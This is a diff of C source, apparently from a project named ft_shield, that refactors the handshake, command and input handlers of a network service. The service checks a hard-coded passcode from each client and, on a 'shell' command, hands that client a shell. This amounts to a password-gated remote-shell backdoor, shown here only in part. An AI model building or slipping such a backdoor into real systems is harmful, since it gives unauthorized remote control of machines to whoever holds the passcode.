@@ -1,10 +1,12 @@
 #include "ft_shield.h"
 
-void handle_handshake(t_client *client, char *input)
+void handle_handshake(t_server *server, int index, char *input)
 {
-	dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
+	t_client *client = &server->clients[index];
+
 	if (client->status == HANDSHAKE)
 	{
+		dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
 		if (strcmp(PASSCODE, input) != 0) {
 			dprintf(2, "Invalid KEY\n");
 			return ;
@@ -15,8 +17,10 @@ void handle_handshake(t_client *client, char *input)
 	// send(client->fd, "$> ", 3, 0);
 }
 
-int	handle_commands(t_client *client, char *input)
+int	handle_commands(t_server *server, int index, char *input)
 {
+	t_client *client = &server->clients[index];
+
 	if (strcmp("clear", input) == 0)
 	{
 		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
@@ -24,8 +28,8 @@ int	handle_commands(t_client *client, char *input)
 	else if (strcmp("shell", input) == 0)
 	{
 		dprintf(2, "client_fd: %d\n", client->fd);
-		shell_function((void*)(long)client->fd);
-		client->fd = 0;
+		shell_function(server, index);
+
 	}
 	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
 	{
@@ -38,16 +42,18 @@ int	handle_commands(t_client *client, char *input)
 	return (0);
 }
 
-int handle_input(t_client *client, char *buffer)
+int handle_input(t_server *server, int index, char *buffer)
 {
 	char	*input = ft_strtrim(buffer, TRIM_CHARS);
 	int		fd;
 
+	t_client *client = &server->clients[index];
+
 	dprintf(2, "readed: [%s]\n", input);
 	if (client->status == HANDSHAKE)
-		handle_handshake(client, input);
+		handle_handshake(server, index, input);
 	else if (client->status == CONNECTED)
-		fd = handle_commands(client, input);
+		fd = handle_commands(server, index, input);
 	free(input);
 	return (fd);
 }
